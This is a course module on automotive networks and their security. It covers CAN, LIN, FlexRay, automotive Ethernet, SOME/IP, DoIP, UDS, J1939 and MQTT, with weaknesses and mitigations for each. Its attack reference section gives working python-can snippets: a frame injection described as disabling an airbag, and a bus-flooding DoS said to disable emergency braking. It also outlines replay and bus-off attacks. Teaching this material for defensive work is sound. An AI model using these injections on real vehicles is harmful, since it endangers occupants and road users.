# Module 02 — Automotive Networks & Security

> Level: Beginner → Intermediate | Est. study time: 8 hours

---

## 2.1 CAN Bus (Controller Area Network)

### Architecture

```
  ECU_1 ──┐                           ┌── ECU_4
  ECU_2 ──┤─────── CAN BUS ───────────┤── ECU_5
  ECU_3 ──┘  (differential pair H/L)  └── ECU_6
  
  Speeds: Low-speed CAN  = 10–125 kbps  (body, comfort)
          High-speed CAN = 125k–1Mbps   (powertrain, chassis)
          CAN FD         = up to 8Mbps  (ADAS, data-heavy)
```

### CAN Frame Structure

```
  ┌─────┬────┬─────┬─────┬────────────────────────┬─────┬───┐
  │ SOF │ ID │ RTR │ DLC │      DATA (0–8 bytes)   │ CRC │EOF│
  │  1b │11b │ 1b  │ 4b  │      0–64 bits          │ 15b │ 7b│
  └─────┴────┴─────┴─────┴────────────────────────┴─────┴───┘
  
  SOF  = Start Of Frame
  ID   = Message identifier (11-bit standard / 29-bit extended)
  RTR  = Remote Transmission Request
  DLC  = Data Length Code (0–8)
  CRC  = Cyclic Redundancy Check
  EOF  = End Of Frame
```

**Real CAN Frame Example — Vehicle Speed:**
```
  ID: 0x3B0  DLC: 8  Data: 00 00 00 00 5A 00 00 00
                             ├────────────┘
                             Signal: VehicleSpeed
                             Raw value: 0x5A = 90d
                             Scale: 0.5 km/h/bit → 45 km/h
```

### CAN Security Weaknesses

| Weakness | Description | Attack |
|----------|-------------|--------|
| No authentication | Any node can send any ID | CAN injection, ECU spoofing |
| Broadcast | All nodes receive all messages | Traffic analysis, replay |
| No encryption | Data transmitted in clear | Signal value reading |
| No sender ID | Cannot know who sent a frame | Impersonation |
| Error frames | Any node can inject error | Bus-off attack |

---

## 2.2 CAN FD (Flexible Data Rate)

CAN FD extends classic CAN with:
- **Payload**: up to 64 bytes (vs 8 bytes)
- **Speed**: up to 8 Mbps in data phase
- **CRC**: 17-bit or 21-bit (stronger)

```
  CAN FD Frame:
  ┌────┬─────┬────┬─────┬─────┬──────────────────────┬──────┐
  │SOF │ ID  │EDL │ BRS │ ESI │  DATA (0–64 bytes)   │ CRC  │
  └────┴─────┴────┴─────┴─────┴──────────────────────┴──────┘
  
  EDL = Extended Data Length bit (1 = CAN FD frame)
  BRS = Bit Rate Switch (1 = data phase uses higher bitrate)
  ESI = Error State Indicator
```

**Security note**: CAN FD still lacks authentication by default.
SecOC (AUTOSAR) must be layered on top.

---

## 2.3 LIN Bus (Local Interconnect Network)

- Single-wire, master-slave, 1–20 kbps
- Used for non-critical functions: windows, mirrors, seat adjusters, lighting
- Master sends schedule table (LDF file defines schedule)
- **Security risk**: Physical access → inject slave responses → malfunction
- **No authentication, no encryption**

```
  LIN Frame:
  Break + Sync + Protected ID + Data (1–8 bytes) + Checksum
```

---

## 2.4 FlexRay

- Deterministic, fault-tolerant, up to 10 Mbps
- Used for X-by-wire (steer-by-wire, brake-by-wire)
- Synchronous + Asynchronous slots (static + dynamic segment)
- **Security risk**: Physical access → inject frames in dynamic segment
- More complex to attack but not immune

---

## 2.5 Automotive Ethernet

| Standard | Speed | Use Case |
|----------|-------|---------|
| 100BASE-T1 | 100 Mbps | Camera, ADAS sensors |
| 1000BASE-T1 | 1 Gbps | ADAS backbone, zonal ECUs |
| 10GBASE-T1 | 10 Gbps | HPC, LiDAR |

**Protocols layered on Automotive Ethernet:**
```
  Application Layer:  SOME/IP, DDS, ROS2, HTTP/REST, MQTT
  Session Layer:      TLS 1.3, DTLS 1.3
  Transport Layer:    TCP/UDP
  Network Layer:      IPv4/IPv6
  Data Link:          Ethernet II frame
  Physical:           100/1000BASE-T1 (single pair)
```

---

## 2.6 SOME/IP (Scalable service-Oriented MiddlewarE over IP)

SOME/IP is the middleware protocol for service-oriented communication in AUTOSAR
Adaptive and modern vehicle architectures.

```
  SOME/IP Message Structure:
  ┌──────────┬──────────┬────────────┬────────┬─────────┬──────────┐
  │ Service  │ Method   │  Length    │ Client │ Session │  Data    │
  │  ID (2B) │  ID (2B) │   (4B)     │ ID(2B) │  ID(2B) │ payload  │
  └──────────┴──────────┴────────────┴────────┴─────────┴──────────┘
  
  Message Types:
    0x00 = REQUEST
    0x01 = REQUEST_NO_RETURN  
    0x02 = NOTIFICATION
    0x80 = RESPONSE
    0x81 = ERROR
```

**SOME/IP Security Vulnerabilities:**
```
1. No built-in authentication (pre-AUTOSAR R22)
2. Service Discovery (SOME/IP-SD) broadcasts — enumerate all services
3. SOME/IP events can be replayed
4. Method spoofing — any node can call any service method
5. No payload encryption by default
6. SOME/IP-SD FindService/OfferService broadcast abuse
```

**Attack Example — SOME/IP Service Enumeration:**
```python
# Attacker on Automotive Ethernet scans for services
import socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind(("", 30490))  # SOME/IP-SD multicast port
sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
# Listen for OfferService messages to enumerate all available services
while True:
    data, addr = sock.recvfrom(4096)
    parse_someip_sd(data)  # extract Service ID + Instance ID
```

---

## 2.7 DoIP (Diagnostics over IP)

DoIP (ISO 13400) enables UDS diagnostics over Ethernet:

```
  Tester ←──── Automotive Ethernet (UDP/TCP) ────→ Gateway ECU
                                                         │
                                               ┌─────────┴──────────┐
                                               │    DoIP Routing     │
                                               │  (logical addresses)│
                                               └────┬───────┬────────┘
                                                    │       │
                                               Target  Target
                                               ECU_1   ECU_2
```

**DoIP Port:** UDP 13400 (discovery), TCP 13400 (diagnostics)

**DoIP Security Attack Vectors:**
```
1. Vehicle Announcement replay → spoof vehicle identity
2. DoIP routing activation without auth → full UDS access to all ECUs
3. No TLS in most production DoIP implementations
4. Malformed DoIP headers → ECU crash (CVE-style)
```

---

## 2.8 UDS (Unified Diagnostic Services)

Full UDS coverage in Module 06. Quick reference:

```
  Key Services:
  0x10  DiagnosticSessionControl    → Change session (default/extended/programming)
  0x11  ECUReset                    → Soft/hard reset
  0x14  ClearDiagnosticInformation  → Clear DTCs
  0x19  ReadDTCInformation          → Read fault codes
  0x22  ReadDataByIdentifier        → Read ECU data (VIN, calibration, etc.)
  0x27  SecurityAccess              → Seed-key authentication
  0x2E  WriteDataByIdentifier       → Write ECU data
  0x31  RoutineControl              → Trigger routines (erase, program)
  0x34  RequestDownload             → Begin firmware flash
  0x36  TransferData                → Actual data transfer
  0x37  RequestTransferExit         → End flash session
  0x3E  TesterPresent               → Keep session alive
```

---

## 2.9 J1939 (Heavy Duty Vehicles)

- SAE J1939 is CAN-based, used in trucks, buses, construction equipment
- 29-bit CAN identifier encodes PGN (Parameter Group Number)
- Higher-level protocol on CAN — defines standard messages for engine, transmission, brakes

```
  J1939 29-bit CAN ID breakdown:
  ┌─────┬────┬────────────┬──────────────┐
  │ P   │ R  │    PGN     │  Source Addr │
  │ 3b  │ 1b │    18b     │     8b       │
  └─────┴────┴────────────┴──────────────┘
  
  P = Priority (0=highest, 7=lowest)
  PGN = Parameter Group Number (defines message content)
  Source Address = which ECU sent it (0x00–0xFE, 0xFF=global)
```

**J1939 Security Issue**: PGN 0x00FEF1 (EBC1 — Electronic Brake Controller) can be
spoofed to command braking on a truck.

---

## 2.10 Protocol Attack Reference

### CAN Injection Attack

```
Attacker connects to OBD-II port (or spliced wire), sends:
  ID: 0x244  DLC: 4  Data: 00 00 00 FF
  ↑ Honda Accord Airbag Disable signal (public research)

Steps:
1. Physical access to OBD-II
2. Sniff CAN traffic with PCAN-USB + SavvyCAN
3. Identify target signal from captured traffic or leaked DBC
4. Craft and inject frame using python-can
5. Target ECU processes injected frame as legitimate
```

**Python CAN Injection:**
```python
import can
bus = can.interface.Bus(channel='PCAN0', bustype='pcan')
msg = can.Message(arbitration_id=0x244, data=[0x00,0x00,0x00,0xFF], is_extended_id=False)
bus.send(msg)
```

### Replay Attack

```
1. Record CAN traffic during keyless entry unlock:
   ID: 0x354  Data: A5 C3 7F 02 00 00 00 00  ← rolling code unlock

2. Replay the recorded sequence later:
   bus.send(recorded_msg)
   
Mitigation: Rolling code counter + timestamp in every message (SecOC)
```

### CAN Bus-Off Attack (Availability Attack)

```
Exploit: CAN error detection forces nodes into "bus-off" state after 256 errors

Attack Method:
1. Attacker synchronizes with a target ECU transmission
2. Attacker injects a dominant bit during recessive bit of target's CRC
3. Target and attacker both detect error
4. Both increment TEC (Transmit Error Counter)
5. Repeat until target's TEC ≥ 256 → target goes BUS-OFF (silent)
6. Critical safety ECU is silenced!

Mitigation: 
- Bus-off recovery timer (500ms auto-recovery in AUTOSAR ComM)
- Anomaly detection (monitor TEC/REC counter escalation)
```

### CAN Flood / DoS Attack

```python
import can, time

bus = can.interface.Bus(channel='vcan0', bustype='socketcan')
# Flood bus with highest priority ID
while True:
    msg = can.Message(arbitration_id=0x000,  # ID=0 = highest priority
                      data=[0xFF]*8,
                      is_extended_id=False)
    bus.send(msg)
    # No sleep = maximum flood → legitimate messages starved
```

**Impact**: High-priority frames consume all bus bandwidth → ADAS ECU cannot
receive radar object list → ACC/AEB effectively disabled.

---

## 2.11 CAN Security Edge Cases

| Edge Case | Root Cause | Detection | Impact | Mitigation |
|-----------|-----------|-----------|--------|------------|
| **Invalid DLC** | Attacker sends DLC=9 (>8) | Monitor DLC field violations | ECU parser crash | DLC validation in gateway |
| **ID collision** | Two ECUs with same ID | Arbitration errors spike | Data corruption | NM (Network Management) ID reservation |
| **Arbitration abuse** | High-priority ID monopoly | Bus load >70% | DoS | Priority filtering, bus load monitor |
| **Counter wrap-around** | 4-bit counter resets to 0 | SecOC counter check | Replay window opens | Extend counter bits, freshness value |
| **CRC mismatch** | Bit flip or injection | CRC error frame | Message dropped, possible BUS-OFF | E2E protection (AUTOSAR E2E) |
| **Timing manipulation** | Delayed/early frames | Cycle time monitor | State machine desync | Timeout supervision |
| **Signal overflow** | Raw value > max spec | Out-of-range check | Actuator runaway | Plausibility filter at receiver |

---

## 2.12 MQTT in Telematics

Modern telematics units (TCU) use MQTT over 4G/5G to cloud backends:

```
  Vehicle TCU ──(4G/5G MQTT TLS 1.3)──► Cloud Broker ──► Backend Services
                                                               │
                                                    ┌──────────┴──────────┐
                                                    │   V2C Data          │
                                                    │   OTA commands      │
                                                    │   Diagnostics       │
                                                    │   Fleet telemetry   │
                                                    └─────────────────────┘
```

**MQTT Security Vulnerabilities:**
```
1. No TLS → plaintext vehicle telemetry (GPS, speed, battery SoC)
2. Weak ACL → subscriber can read other vehicles' topics
3. Broker misconfiguration → anonymous publish to vehicle command topic
4. QoS 0 → no delivery confirmation, replay possible
5. Retained messages → old commands replayed to new session
6. Will message abuse → fake "vehicle offline" to disable remote services
```

**Secure MQTT Configuration:**
```
- TLS 1.3 mutual authentication (vehicle cert + broker cert)
- MQTT 5.0 with authentication packet
- Topic namespacing: vehicles/{VIN}/{function} with ACL per VIN
- Message expiry property (prevents replay)
- Rate limiting per client
```

---

## 2.13 Network Security Summary Table

| Protocol | Layer | Max Speed | Auth | Encrypt | Primary Threat |
|----------|-------|-----------|------|---------|----------------|
| CAN 2.0 | L2 | 1 Mbps | ❌ | ❌ | Injection, spoofing |
| CAN FD | L2 | 8 Mbps | ❌ | ❌ | Injection, spoofing |
| LIN | L1-2 | 20 kbps | ❌ | ❌ | Physical injection |
| FlexRay | L2 | 10 Mbps | ❌ | ❌ | Dynamic slot injection |
| SOME/IP | L7 | Eth speed | ❌* | ❌* | Service abuse, SD enum |
| DoIP | L4-7 | Eth speed | ❌* | ❌* | Routing abuse, UDS access |
| MQTT | L7 | Varies | ✅* | ✅* | Broker compromise, replay |
| UDS over CAN | L7 | CAN speed | ✅ (Seed-Key) | ❌ | Seed-key bypass |

*Optional TLS/mTLS overlay; not always deployed

---

**Next Module**: [03 — Threat Modeling & TARA](03_threat_modeling.md)
